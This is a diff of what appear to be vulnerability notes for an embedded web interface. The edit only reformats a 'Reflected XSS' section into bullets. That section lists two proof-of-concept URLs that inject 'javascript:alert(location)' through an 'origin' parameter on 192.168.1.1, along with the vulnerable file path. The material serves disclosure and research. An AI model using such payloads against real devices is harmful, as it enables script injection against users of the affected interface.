@@ -4,10 +4,10 @@
 
 ### Reflected XSS
 
-URL: http://192.168.1.1/check_browser?origin=javascript:alert(location)
-URL: http://192.168.1.1/browser_check/build/rus/old.html?origin=javascript:alert(location)
-Requires a click on "continue" button, unsafe relocation.
-File: /srv/anweb/browser_check/build/eng/bad.html
+- URL: http://192.168.1.1/check_browser?origin=javascript:alert(location)
+- URL: http://192.168.1.1/browser_check/build/rus/old.html?origin=javascript:alert(location)
+- Requires a click on "continue" button, unsafe relocation.
+- File: /srv/anweb/browser_check/build/eng/bad.html
 
 ## Paths
 
